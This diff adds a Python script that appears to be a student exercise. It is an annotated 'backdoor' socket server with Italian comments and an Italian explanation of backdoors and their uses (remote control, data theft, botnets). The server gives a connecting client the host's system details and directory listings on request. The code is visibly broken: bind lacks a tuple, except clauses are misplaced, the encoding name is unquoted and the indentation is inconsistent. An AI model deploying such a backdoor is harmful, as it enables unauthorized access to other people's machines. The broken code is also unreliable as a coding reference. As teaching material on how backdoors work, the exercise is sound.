@@ -1,0 +1,36 @@
+import socket, platform, os                                             >> importa i moduli per utilizzare la funzionalità socket,la quale serve per scambiare informazioni tra computer sorgente e destinatario, ottendendo informazioni sul sistema (platform) e interaggire con il sistema operativo (os)
+
+SRV_ADDR = ""                                                           >> definisce l'indirizzo IP del server
+SRV_PORT = 1234                                                         >> definisce la porta su cui il server sarà in ascolto
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                   >> funzione(s) restituisce come valore un nuovo socket, e la funzione accetta i parametri AF_INET, che specifica che vogliamo un socket IPv4, e SOCK_STREAM il quale specifica che vogliamo una connessione TCP 
+s.bind(SRV_ADDR, SRV_PORT)                                              >> metodo bind o "binding" serve per collegare il socket all'indirizzo e la porta specificata e richiede una ((TUPLA))
+s.listen(1)                                                             >> mette il socket in modalità di ascolto                                     
+connection, addres = s.accept()                                         >> metodo accept per accettare e stabilire la connessione con il client che proverà a connettersi al nostro servizio, restituisce due argomenti: -connection: che viene utilizzato per lo scambio dati, -addres: Ipv4 del client che si connette
+print ("client connected:", addres)                                     >> funzione print nota, stampa IPv4 del client che si connette
+
+while 1:                                                                >> ciclo while infinito (o sempre vero) ,per l'1
+    try:                                                                >> ciclo try che gestisce le eccezioni
+        data = connection.recv(1024)                                    >> ricezione dati del client tramite la connessione .recv(1024) che riceve fino a 1024 byìyte di dati 
+        except:continue                                                 >> eccezione gestita da try la quale , se si dovesse verificare un eccezione durante la ricezione di dati, il programma continuerà il ciclo senza arrestarsi
+    if(data.decode('utf-8') == '1'):                                    >> ciclo if : se il dato ricevuto da client è 1 il server invia informazioni sulla piattaforma e la macchina
+        tosend = platform.platform() + " " + platform.machine()         >> to send : invia il contenuto al client ottenendo informazioni da platform.platform(sistema) e platform.machine(macchina). 
+        connection.sendall(tosend.encode())                             >> sendall : il client riceverà le informazioni sulla piattaforma e sulla macchina del server.
+    elif(data.decode('utf-8') == '2'):                                  >> elif : se il dato è 2 il server riceve e invia una lista di file in quel percorso client
+        data = connection.recv(1024)                                    
+    try:                                                                
+        filelist = os.listdir(data.decode(utf-8))                       >> decodifica i dati usando l'encoding UTF-8 e crea un elenco di file nel percorso specificato, os.listdir() restituisce una lista di nomi di file nella directory specificata
+        tosend = ""                                                     
+        for x in filelist:                                              >> loop for: esegue operazioni su ogni elemento della lista, i nomi dei file presenti nella directory vengono rappresentati da (x), quindi ogni file presente in filelist viene collegato alla stringa tosend che verra inviata al client
+            tosend += "," + x                                           
+        except:                                                         
+            tosend = "wrong path"                                       
+        connection.sendall(tosend.encode())                             >> invio di dati al client codificati in formato binario utilizzando encode()
+    elif(data.decode('utf-8') == '0'):                                  >> se i dati sono 0 il server chiude la connessione e si prepara ad accettarne un altra
+        connection.close()                                              >> chiude la connessione con il client
+        connection, addres = s.accept()                                 >> prepara il server per accettare una nuova connessione
+
+
+
+Spiegazione backdoor : è un tipo di software installato segretamente su un sistema informatico che consente l'accesso al sistema stesso da parte di un utente non autorizzato, possiamo considerarla come una porta nascosta che consente l'accesso ad una persona non autorizzata ad accedere senza che tu te ne accorga, si possono inserire nel software attraverso vunlerabilità o attraverso l'ingegneria sociale(per esempio: inducendo un utente ad installare il software malevolo senza rendersene conto )
+Utilizzo: controllo del computer a distanza, rubare informazioni sensibili ,installare malware o creare un botnet/zombie ovvero utilizzare il computer per fare attacchi, invio di spam e altro 
